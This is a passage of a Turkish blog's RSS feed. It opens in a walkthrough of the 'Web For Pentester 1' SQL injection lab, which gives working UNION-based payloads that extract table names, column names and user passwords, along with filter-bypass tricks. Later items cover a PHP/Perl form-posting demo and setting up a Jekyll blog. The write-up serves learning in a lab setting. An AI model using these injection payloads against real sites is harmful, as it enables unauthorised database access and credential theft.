&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' union select table_name,version(),3,4,5 
from information_schema.tables %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Bütün Sütun isimleri için:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=user1' union select column_name,2,3,4,5 
from information_schema.columns %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Tablo isimlerini normal yazarak hata alırsak onların hexadecimal karşılıklarını deneyerek sonuca ulaşabiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root' union select column_name,2,3,4,5 
from information_schema.columns where table_name = 0x7573657273 %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Sırayla aşağıdaki işlemleri uygulayarak tablodaki kullanıcı şifrelerini bulmaya çalışalım.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example1.php?name=root' union select 
database(),2,3,4,5 %23 --&amp;gt; Kullanılan veri tabanının ismini çektiğimiz komut.

2. http://192.168.96.129/sqli/example1.php?name=root' union select table_name,2,3,4,5 
from information_schema.tables where 
table_schema = database() %23 --&amp;gt; Kullanılan tablonun adını çektiğimiz komut.

3. http://192.168.96.129/sqli/example1.php?name=root' UNION SELECT 1,column_name,3,4,5 
FROM information_schema.columns WHERE table_name=&quot;users&quot; %23 --&amp;gt; tablodaki sütunların 
isimlerini çektiğimiz komut.

4. http://192.168.96.129/sqli/example1.php?name=root' union select name,passwd,3,4,5 
from exercises.users %23 --&amp;gt; kullanıcı isimlerini ve şifrelerini çektiğimiz komut.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Çeşitli komut varyasyonları ile farklı bilgiler edinebiliriz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Example 2&lt;/strong&gt;&lt;br /&gt;
      1. Soruda denediğimiz ifadenin aynısını deniyoruz ve &lt;strong&gt;‘ERROR NO SPACE’&lt;/strong&gt; yazısını görüyoruz. Buradan aralara
koyduğumuz boşluk karakterinin sorun oluşturduğunu anlıyoruz.  Syntax yapısını sağlamak için boşluk yerine tab koyabiliriz. Tabiki Tab tuşuna basarak yapabildiğimiz bir olay değil. TAB karakteri &lt;strong&gt;‘%09’&lt;/strong&gt; ile ifade edilir.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example2.php?name=root'or%091%09or'	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 3&lt;/strong&gt;&lt;br /&gt;
      ‘or 1 or’ denediğimizde  &lt;strong&gt; ‘ERROR NO SPACE’ &lt;/strong&gt;. Sonrasında bir önceki sorudaki gibi  ‘or%091%09or’ deniyoruz fakat yine aynı sonuç : &lt;strong&gt;‘ERROR NO SPACE’&lt;/strong&gt; . Boşluğa ve Tab’a izin vermiyor. Syntax yapısını sağlaması için boşluk benzeri birşey koyacağız ama ne boşluk olacak ne de tab. Biraz araştırma sonucu yorum satırı haline getirerek oralardaki karakter koyma ihtiyacından kurtuluyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example3.php?name=root'or/**/1/**/or
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 4&lt;/strong&gt;&lt;br /&gt;
      URL’nin devamına ‘or 1 or’ denediğimizde bir sonuç alamıyoruz. Birkaç denemeden sonra tırnak karakteri kullanmamamız gerektiğini anlıyoruz ve yalnızca &lt;strong&gt;or 1&lt;/strong&gt; yazarak sonuçlari listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example4.php?id=2 or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 5&lt;/strong&gt;&lt;br /&gt;
      4. soruda olduğu gibi aynı işlemi uygulayınca sonucu listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example5.php?id=2 or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 6&lt;/strong&gt;&lt;br /&gt;
      Tırnak koyup bir kontrol ediyoruz ve &lt;strong&gt;‘ERROR INTEGER REQUIRED’&lt;/strong&gt; yazısını görüyoruz. İfademizi bir Integer ile bitirmek için  or 1  yazıyoruz .&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example6.php?id=2 or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 7&lt;/strong&gt;&lt;br /&gt;
      Tırnak karakteri koyduğumuzda &lt;strong&gt;‘ERROR INTEGER REQUIRED’&lt;/strong&gt; yazısını görüyoruz. Bir önceki soruda olduğu gibi or 1 yazıp deniyoruz ama aynı hata devam ediyor. Burada integer isteyen yerin bizim ifademizden önce gelen yer olduğunu deneyerek buluyoruz.&lt;strong&gt;‘%0A’&lt;/strong&gt; karakteri alt satıra geçme anlamına geliyor. Bunu kullanarak aşağıdaki ifade sonuçları listeliyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example7.php?id=2%0A or 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 8&lt;/strong&gt;&lt;br /&gt;
      Burada &lt;strong&gt;order&lt;/strong&gt; kelimesini görünce order yapısıyla ilgili sorgular göndermeye çalışıyoruz. Düz tırnak gönderdiğimizde bir sonuç alamıyoruz ve denemeler sonucu yatay tırnak(`) kullanıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. `asc %23
2. `desc %23
3. ` %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;ifadeleri işimizi görüyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example8.php?order=name`asc %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example 9&lt;/strong&gt;&lt;br /&gt;
      Düz tırnak ve yatay tırnak karakterleri hata veriyor ve bunları kullanmadan deneyerek sonuçları listeliyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. asc %23
2. desc %23
3. %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;İfadelerinden herhangi biriyle sorgumuzu çalıştırıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. http://192.168.96.129/sqli/example9.php?order=name desc %23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;
      Böylelikle &lt;strong&gt;WEB For Pentester 1 SQL Injections&lt;/strong&gt; bölümünün çözümünü tamamlamış olduk. Tüm sorular için aynı detaya inme gereği duymadık ilk sorudaki sorgulardan yola çıkarak aynı sonuçları elde edebilirsiniz.&lt;/p&gt;

</description>
      </item>
    
      <item>
        <title>PHP ve Perl Kullanarak HttpApi Oluşturma</title>
        <link>http://localhost:4000/http-api</link>
        <pubDate>Wed, 15 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      Günlük hayatta standart olarak görebileceğimiz veri kaydeden&lt;strong&gt;(Register Form)&lt;/strong&gt; bir WEB 
uygulaması var elimizde. Uygulama sizden bir takım veriler istiyor ve aldığı 
verileri bir text dosyasına yazıyor .Bu bir database’de olabilirdi. Biz bu 
işleme &lt;strong&gt;‘Post Method’&lt;/strong&gt; diyoruz. Örneğimizde Standart bir form oluşturduk ve 
bu forma girdiğimiz verileri, PHP komutları ile alıp birer değişkene atadık.
Sonra PHP dosya işleme komutlarını (fopen,fwrite) kullanarak bunlara bir text
dosyasına yazdırdık. Bu söylediğimiz gibi bir Database’de olabilirdi.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
 

$name = $_POST[&quot;name&quot;];
$surname = $_POST[&quot;surname&quot;];


$myfile = fopen(&quot;data.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
  
fwrite($myfile, $name);
fwrite($myfile, $surname);
fclose($myfile);
echo $name;
echo $surname;

 
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      İkinci aşama olarak Perl dilini kullanarak POST işlemi gerçekleş-
tirmeye çalıştık. &lt;strong&gt;‘LWP::UserAgent’&lt;/strong&gt; sınıfını import ettik ve burada
 tanımlı ‘POST’ işlemi ile hedef siteye POST işlemi gerçekleştirdik.
 Post fonksiyonu parametre olarak URL ve post edilecek verileri alıyor. Bu 
program sayesinde tarayıcıdan giriş yapmadanda uygulamaya verileri ‘POST’
edebilirsiniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;strict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;LWP::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAgent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$isim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ctr1l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$soyisim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Plus'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'http://localhost/HttpApi/testpost.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ua&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;LWP::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;UserAgent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ua&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$isim&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'surname'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$soyisim&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;decoded_content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cgi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cgi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Not: LWP :: UserAgent nesneleri, web isteklerini göndermek için kullanılabilir.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Not: CGI , HTTP isteklerini ve yanıtlarını hazırlamak için kullanılır.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;       İçeride kullanılan HTML yapısı da basit bir biçimde şu biçimdedir:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;style.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;testpost.php&quot;&lt;/span&gt;  &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cont&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt; REGISTER!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;

 	Name : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Username&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
Surname : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;surname&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
	Register  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Go&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
      </item>
    
      <item>
        <title>Jekyll İle Blog Oluşturma</title>
        <link>http://localhost:4000/jekyll-ile-blog-kurulumu</link>
        <pubDate>Tue, 14 Mar 2017 00:00:00 +0300</pubDate>
        <author></author>
        <description>&lt;p&gt;      Jekyll , Ruby kullanılarak yazılmış bir statik site üreticisidir. Jekyll, markdown ve scss formatında yazdığımız yazıları html ve css kodlarına çevirerek  sitemizi üretir. Bilgisayarımıza ‘RubyGems’ ile jekyll kurmak için aşağıdaki komutu terminale yazabilirsiniz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gem install jekyll 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Jekyll artık kuruldu. Şimdi statik blog sitemizi oluştuma aşamasına geçebiliriz. Site klasörümüzü 
oluştumak istediğimiz dizine gidip aşağıdaki komutları girerek site klasörünü meydana getirebiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jekyll new klasor_adi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Klasörümüz oluşturuldu. İlk komut ile dosyaların olduğu dizine gidip sonrasında ikinci komut ile sitemizi
localhost’umuzda yayınlayabiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd klasor_adi

jekyll serve 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Çalışan servisi tarayıcımızdan http://localhost:4000 adresine giderek görebiliriz. Burada Jekyll’ ın bize 
default olarak oluşturduğu siteyi göreceğiz. &lt;a href=&quot;http://jekyllthemes.org/&quot;&gt;http://jekyllthemes.org/&lt;/a&gt; adresini ziyaret ederek buradan çevrimiçi tema edinip ,doğrudan  veya üzerinde değişiklikler yaparak kendi blogumuzu düzenleyebiliriz.&lt;/p&gt;

&lt;p&gt;      Oluşturduğumuz siteyi github üzerinden yayınlamak için öncelikle bir github hesabımız olması gerekiyor.
&lt;a href=&quot;https://github.com/&quot;&gt;https://github.com/&lt;/a&gt; adresini ziyaret ederek bir github hesabi açabiliriz. Oturum açıp profile girdikten sonra Repository bölümüne gelip buradan da new butonuna tıklayarak yenir bir repository oluşturabiliriz.
Bu repository bizim blogumuzdaki tüm dosyaları tutacak yer olacak. Repository ‘nin adı, &lt;strong&gt;githubkullaniciadi.github.io&lt;/strong&gt; şeklinde olmalıdır. Böylece blog sayfamız için gereken repository ‘i
 oluşturmuş olduk.  Şimdi sitemizi bu repository ‘e yollamaya geldi. Bundan önce sitemizi localhost’dan çıkarıp tüm ağlarda tanınır hale getirecek olduğumuz için site klasörümüz içerisindeki &lt;strong&gt;_config.yml&lt;/strong&gt; dosyasında bir değişiklik yapmamız gerekiyor. Buradaki&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;url : “”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;kısmını&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;url : “https://githubkullaniciadi.github.io”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;olarak düzenliyoruz.&lt;/p&gt;

&lt;p&gt;      Şimdi sıra geldi dosyalarımız github repository’ imize yollamaya. Bunun için terminale gelip aşağıdaki komutları yazabiliriz ve dosyalarımızı gönderebiliriz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd klasor_adi

git init

git remote add origin https://github.com/githubkullaniciadi/githubkullaniciadi.github.io.git

git add -A

git commit -m &quot;gönderi&quot;

git push origin master
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;      Jekyll kullanımı kolay ve github üzerinden çalışabilen güncel bir servistir. Değişiklikler anlamında daha fazla hareket edebilmek ve kullanışlı olması açısından  için &lt;strong&gt;Markdown&lt;/strong&gt; syntax yapısı araştırılabilir.&lt;/p&gt;

</description>
      </item>
    

  </channel>
</rss>
